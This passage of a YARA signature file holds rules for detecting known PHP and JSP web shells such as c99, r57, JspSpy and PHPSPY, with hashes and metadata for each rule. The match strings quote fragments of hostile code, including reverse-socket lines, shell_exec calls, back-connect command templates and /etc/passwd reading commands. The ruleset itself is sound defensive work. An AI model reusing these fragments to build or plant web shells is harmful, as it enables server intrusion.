\"1.7\"\n      \n   strings:\n      $s8 = \"else {echo \\\"Running datapipe... ok! Connect to <b>\\\".getenv(\\\"SERVER_ADDR\\\"\" \n   condition: \n      all of them\n}\n\nrule Webshell_2008_2009lite_2009mssql_RID31A2 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2008.php, 2009lite.php, 2009mssql.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:30:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"3f4d454d27ecc0013e783ed921eeecde\"\n      hash2 = \"aa17b71bb93c6789911bd1c9df834ff9\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<a href=\\\"javascript:godir(\\\\''.$drive->Path.'/\\\\');\" \n      $s7 = \"p('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all\" \n   condition: \n      all of them\n}\n\nrule Webshell_Arabicspy_PHPSPY_RID3087 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files shell.php, phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, arabicspy.php, PHPSPY.php, hkrkoz.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:43:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b68bfafc6059fd26732fa07fb6f7f640\"\n      hash2 = \"42f211cec8032eb0881e87ebdb3d7224\"\n      hash3 = \"40a1f840111996ff7200d18968e42cfe\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$mainpath_info           = explode('/', $mainpath);\" fullword\n      $s6 = \"if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == \\\"d\" \n   condition: \n      all of them\n}\n\nrule Webshell_JspSpyJDK5_RID2E1D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:00:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"14e9688c86b454ed48171a9d4f48ace8\"\n      hash2 = \"341298482cf90febebb8616426080d1d\"\n      hash3 = \"88fc87e7c58249a398efd5ceae636073\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"url_con.setRequestProperty(\\\"REFERER\\\", \\\"\\\"+fckal+\\\"\\\");\" fullword\n      $s9 = \"FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \\\"GBK\\\");\" fullword\n   condition: \n      1 of them\n}\n\nrule Webshell_Dive_Shell_Emperor_Hacking_Team_RID36B8 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files Dive Shell 1.0 - Emperor Hacking Team.php, phpshell.php, SimShell 1.0 - Simorgh Security MGZ.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 17:07:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f8a6d5306fb37414c5c772315a27832f\"\n      hash2 = \"37cb1db26b1b0161a4bf678a6b4565bd\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== fals\" \n      $s9 = \"if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_JFolder_jfolder01_xxx_RID32B9 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, suiyue.jsp, warn.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:17:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9f54aa7b43797be9bab7d094f238b4ff\"\n      hash2 = \"793b3d0a740dbf355df3e6f68b8217a4\"\n      hash3 = \"8979594423b68489024447474d113894\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"&nbsp;<TEXTAREA NAME=\\\"cqq\\\" ROWS=\\\"20\\\" COLS=\\\"100%\\\"><%=sbCmd.toString()%></TE\" \n   condition: \n      all of them\n}\n\nrule Webshell_jsp_reverse_jsp_RID30FA : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files jsp-reverse.jsp, jsp-reverse.jsp, jspbd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:02:51\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ea87f0c1f0535610becadf5a98aca2fc\"\n      hash2 = \"7d5e9732766cf5b8edca9b7ae2b6028f\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"osw = new BufferedWriter(new OutputStreamWriter(os));\" fullword\n      $s7 = \"sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\" fullword\n      $s9 = \"isr = new BufferedReader(new InputStreamReader(is));\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_JFolder_jfolder01_jsp_leo_RID343D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 400.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, leo.jsp, warn.jsp, webshell-nc.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:22:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"793b3d0a740dbf355df3e6f68b8217a4\"\n      hash2 = \"8979594423b68489024447474d113894\"\n      hash3 = \"ec482fc969d182e5440521c913bab9bd\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"sbFolder.append(\\\"<tr><td >&nbsp;</td><td>\\\");\" fullword\n      $s1 = \"return filesize / intDivisor + \\\".\\\" + strAfterComma + \\\" \\\" + strUnit;\" fullword\n      $s5 = \"FileInfo fi = (FileInfo) ht.get(\\\"cqqUploadFile\\\");\" fullword\n      $s6 = \"<input type=\\\"hidden\\\" name=\\\"cmd\\\" value=\\\"<%=strCmd%>\\\">\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_2_520_job_JspWebshell_1_2_ma1_ma4_2_RID369B : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, job.jsp, JspWebshell 1.2.jsp, ma1.jsp, ma4.jsp, 2.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 17:03:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9abd397c6498c41967b4dd327cf8b55a\"\n      hash2 = \"56c005690da2558690c4aa305a31ad37\"\n      hash3 = \"70a0ee2624e5bbe5525ccadc467519f6\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {\" fullword\n      $s6 = \"password = (String)session.getAttribute(\\\"password\\\");\" fullword\n      $s7 = \"insReader = new InputStreamReader(proc.getInputStream(), Charset.forName(\\\"GB231\" \n   condition: \n      2 of them\n}\n\nrule Webshell_gfs_sh_r57shell_r57shell127_SnIpEr_SA_xxx_RID39AE : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 19:14:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ef43fef943e9df90ddb6257950b3538f\"\n      hash2 = \"ae025c886fbe7f9ed159f49593674832\"\n      hash3 = \"911195a9b7c010f61b66439d9048f400\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI\" \n      $s11 = \"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KIC\" \n   condition: \n      all of them\n}\n\nrule Webshell_PHPJackal_itsecteam_shell_RID3469 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files itsec.php, PHPJackal.php, itsecteam_shell.php, jHn.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:29:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e2830d3286001d1455479849aacbbb38\"\n      hash2 = \"bd6d3b2763c705a01cc2b3f105a25fa4\"\n      hash3 = \"40c6ecf77253e805ace85f119fe1cebb\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$link=pg_connect(\\\"host=$host dbname=$db user=$user password=$pass\\\");\" fullword\n      $s6 = \"while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|\" \n      $s9 = \"while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Shell_Biz_c100_RID2F75 : DEMO SCRIPT T1087_001 T1105 T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:58:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"27786d1e0b1046a1a7f67ee41c64bf4c\"\n      hash2 = \"68c0629d08b1664f5bcce7d7f5f71d22\"\n      tags = \"DEMO, SCRIPT, T1087_001, T1105, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if ($data{0} == \\\"\\\\x99\\\" and $data{1} == \\\"\\\\x01\\\") {return \\\"Error: \\\".$stri\" \n      $s3 = \"<OPTION VALUE=\\\"find /etc/ -type f -perm -o+w 2> /dev/null\\\"\" \n      $s4 = \"<OPTION VALUE=\\\"cat /proc/version /proc/cpuinfo\\\">CPUINFO\" fullword\n      $s7 = \"<OPTION VALUE=\\\"wget http://ftp.powernet.com.tr/supermail/de\" \n      $s9 = \"<OPTION VALUE=\\\"cut -d: -f1,2,3 /etc/passwd | grep ::\\\">USER\" \n   condition: \n      2 of them\n}\n\nrule Webshell_NIX_REMOTE_WEB_SHELL_RID30D4 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:56:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"f3ca29b7999643507081caab926e2e74\"\n      hash2 = \"527cf81f9272919bf872007e21c4bdda\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<td><input size=\\\"48\\\" value=\\\"$docr/\\\" name=\\\"path\\\" type=\\\"text\\\"><input type=\" \n      $s2 = \"$uploadfile = $_POST['path'].$_FILES['file']['name'];\" fullword\n      $s6 = \"elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}\" fullword\n      $s7 = \"if ($_POST['path']==\\\"\\\"){$uploadfile = $_FILES['file']['name'];}\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_C99_w4cking_Shell_RID30C8 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:54:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d3f38a6dc54a73d304932d9227a739ec\"\n      hash2 = \"9c34adbc8fd8d908cbb341734830f971\"\n      hash3 = \"f2fa878de03732fbf5c86d656467ff50\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<b>HEXDUMP:</b><nobr>\" \n      $s4 = \"if ($filestealth) {$stat = stat($d.$f);}\" fullword\n      $s5 = \"while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \\\"<tr><td>\\\".$r\" \n      $s6 = \"if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \\\"DB \" \n      $s8 = \"echo \\\"<center><b>Server-status variables:</b><br><br>\\\";\" fullword\n      $s9 = \"echo \\\"<textarea cols=80 rows=10>\\\".htmlspecialchars($encoded).\\\"</textarea>\" \n   condition: \n      2 of them\n}\n\nrule Webshell_phpspy_2006_arabicspy_RID328E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 14:10:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"aa17b71bb93c6789911bd1c9df834ff9\"\n      hash2 = \"b68bfafc6059fd26732fa07fb6f7f640\"\n      hash3 = \"40a1f840111996ff7200d18968e42cfe\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$this -> addFile($content, $filename);\" fullword\n      $s3 = \"function addFile($data, $name, $time = 0) {\" fullword\n      $s8 = \"function unix2DosTime($unixtime = 0) {\" fullword\n      $s9 = \"foreach($filelist as $filename){\" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_c99_c99shell_RID2EC7 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:29:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0f5b9238d281bc6ac13406bb24ac2a5b\"\n      hash2 = \"68c0629d08b1664f5bcce7d7f5f71d22\"\n      hash3 = \"048ccc01b873b40d57ce25a4c56ea717\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"  if (unlink(_FILE_)) {@ob_clean(); echo \\\"Thanks for using c99shell v.\\\".$shv\" \n      $s3 = \"  \\\"c99sh_backconn.pl\\\"=>array(\\\"Using PERL\\\",\\\"perl %path %host %port\\\"),\" fullword\n      $s4 = \"<br><TABLE style=\\\"BORDER-COLLAPSE: collapse\\\" cellSpacing=0 borderColorDark=#66\" \n      $s7 = \"   elseif (!$data = c99getsource($bind[\\\"src\\\"])) {echo \\\"Can't download sources\" \n      $s8 = \"  \\\"c99sh_datapipe.pl\\\"=>array(\\\"Using PERL\\\",\\\"perl %path %localport %remotehos\" \n      $s9 = \"   elseif (!$data = c99getsource($bc[\\\"src\\\"])) {echo \\\"Can't download sources!\" \n   condition: \n      2 of them\n}\n\nrule Webshell_ok_style_1_JspSpy_RID3168 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:21:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d71716df5042880ef84427acee8b121e\"\n      hash2 = \"344f9073576a066142b2023629539ebd\"\n      hash3 = \"32dea47d9c13f9000c4c807561341bee\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"\\\"+f.canRead()+\\\" / \\\"+f.canWrite()+\\\" / \\\"+f.canExecute()+\\\"</td>\\\"+\" fullword\n      $s4 = \"out.println(\\\"<h2>File Manager - Current disk &quot;\\\"+(cr.indexOf(\\\"/\\\") == 0?\" \n      $s7 = \"String execute = f.canExecute() ? \\\"checked=\\\\\\\"checked\\\\\\\"\\\" : \\\"\\\";\" fullword\n      $s8 = \"\\\"<td nowrap>\\\"+f.canRead()+\\\" / \\\"+f.canWrite()+\\\" / \\\"+f.canExecute()+\\\"</td>\" \n   condition: \n      2 of them\n}\n\nrule Webshell_queryDong_spyjsp2010_zend_RID343F : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:22:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"059058a27a7b0059e2c2f007ad4675ef\"\n      hash2 = \"8b457934da3821ba58b06a113e0d53d9\"\n      hash3 = \"d44df8b1543b837e57cc8f25a0a68d92\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"return new Double(format.format(value)).doubleValue();\" fullword\n      $s5 = \"File tempF = new File(savePath);\" fullword\n      $s9 = \"if (tempF.isDirectory()) {\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_c99_c99shell_2_RID2F58 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files c99.php, c99shell.php, c99.php, c99shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:53:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d3f38a6dc54a73d304932d9227a739ec\"\n      hash2 = \"157b4ac3c7ba3a36e546e81e9279eab5\"\n      hash3 = \"048ccc01b873b40d57ce25a4c56ea717\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"$bindport_pass = \\\"c99\\\";\" fullword\n      $s5 = \" else {echo \\\"<b>Execution PHP-code</b>\\\"; if (empty($eval_txt)) {$eval_txt = tr\" \n   condition: \n      1 of them\n}\n\nrule Webshell_r57shell_antichat_RID3147 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 13:15:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"513b7be8bd0595c377283a7c87b44b2e\"\n      hash2 = \"1d912c55b96e2efe8ca873d6040e3b30\"\n      hash3 = \"4108f28a9792b50d95f95b9e5314fa1e\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"$res   = @mysql_query(\\\"SHOW CREATE TABLE `\\\".$_POST['mysql_tbl'].\\\"`\\\", $d\" \n      $s7 = \"$sql1 .= $row[1].\\\"\\\\r\\\\n\\\\r\\\\n\\\";\" fullword\n      $s8 = \"if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }\" fullword\n      $s9 = \"foreach($values as $k=>$v) {$values[$k] = addslashes($v);}\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx_RID360A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 16:38:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4745d510fed4378e4b1730f56f25e569\"\n      hash2 = \"f3ca29b7999643507081caab926e2e74\"\n      hash3 = \"46a18979750fa458a04343cf58faa9bd\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"BODY, TD, TR {\" fullword\n      $s5 = \"$d=str_replace(\\\"\\\\\\\\\\\",\\\"/\\\",$d);\" fullword\n      $s6 = \"if ($file==\\\".\\\" || $file==\\\"..\\\") continue;\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_css_dm_he1p_xxx_RID30B3 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:51:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"059058a27a7b0059e2c2f007ad4675ef\"\n      hash2 = \"ae76c77fb7a234380cd0ebb6fe1bcddf\"\n      hash3 = \"76037ebd781ad0eac363d56fc81f4b4f\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"String savePath = request.getParameter(\\\"savepath\\\");\" fullword\n      $s4 = \"URL downUrl = new URL(downFileUrl);\" fullword\n      $s5 = \"if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))\" fullword\n      $s6 = \"String downFileUrl = request.getParameter(\\\"url\\\");\" fullword\n      $s7 = \"FileInputStream fInput = new FileInputStream(f);\" fullword\n      $s8 = \"URLConnection conn = downUrl.openConnection();\" fullword\n      $s9 = \"sis = request.getInputStream();\" fullword\n   condition: \n      4 of them\n}\n\nrule Webshell_JSP_icesword_RID2F52 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:52:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9abd397c6498c41967b4dd327cf8b55a\"\n      hash2 = \"077f4b1b6d705d223b6d644a4f3eebae\"\n      hash3 = \"56c005690da2558690c4aa305a31ad37\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\"></head>\" fullword\n      $s3 = \"<input type=\\\"hidden\\\" name=\\\"_EVENTTARGET\\\" value=\\\"\\\" />\" fullword\n      $s8 = \"<input type=\\\"hidden\\\" name=\\\"_EVENTARGUMENT\\\" value=\\\"\\\" />\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_JFolder_JSP_2_RID2F29 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 11:45:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9f54aa7b43797be9bab7d094f238b4ff\"\n      hash2 = \"793b3d0a740dbf355df3e6f68b8217a4\"\n      hash3 = \"8979594423b68489024447474d113894\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<table width=\\\"100%\\\" border=\\\"1\\\" cellspacing=\\\"0\\\" cellpadding=\\\"5\\\" bordercol\" \n      $s2 = \" KB </td>\" fullword\n      $s3 = \"<table width=\\\"98%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"\" \n      $s4 = \"<!-- <tr align=\\\"center\\\"> \" fullword\n   condition: \n      all of them\n}\n\nrule Webshell_phpspy_2006_PHPSPY_RID30B4 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 12:51:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"42f211cec8032eb0881e87ebdb3d7224\"\n      hash2 = \"40a1f840111996ff7200d18968e42cfe\"\n      hash3 = \"0712e3dc262b4e1f98ed25760b206836\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"http://www.4ngel.net\" fullword\n      $s5 = \"</a> | <a href=\\\"?action=phpenv\\\">PHP\" fullword\n      $s8 = \"echo $msg=@fwrite($fp,$_POST['filecontent']) ? \\\"\" fullword\n      $s9 = \"Codz by Angel\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_c99_locus7s_c99_w4cking_xxx_RID34BB : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects Web Shell from tennc webshell repo\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:43:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9c34adbc8fd8d908cbb341734830f971\"\n      hash2 = \"ef43fef943e9df90ddb6257950b3538f\"\n      hash3 = \"ae025c886fbe7f9ed159f49593674832\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$res = @shell_exec($cfe);\" fullword\n      $s8 = \"$res = @ob_get_contents();\" fullword\n      $s9 = \"@exec($cfe,$res);\" fullword\n   condition: \n      2 of them\n}\n\nrule Webshell_browser_201_3_ma_ma2_download_RID3571 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 16:13:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a7e25b8ac605753ed0c438db93f6c498\"\n      hash2 = \"fb8c6c3a69b93e5e7193036fd31a958d\"\n      hash3 = \"4cc68fa572e88b669bce606c7ace0ae9\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"private static final int EDITFIELD_ROWS = 30;\" fullword\n      $s2 = \"private static String tempdir = \\\".\\\";\" fullword\n      $s6 = \"<input type=\\\"hidden\\\" name=\\\"dir\\\" value=\\\"<%=request.getAttribute(\\\"dir\\\")%>\\\"\" \n   condition: \n      2 of them\n}\n\nrule Webshell_000_403_c5_queryDong_spyjsp2010_RID350B : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-28 15:56:21\"\n      score = 70\n      customer = \"demo\"\n      license = 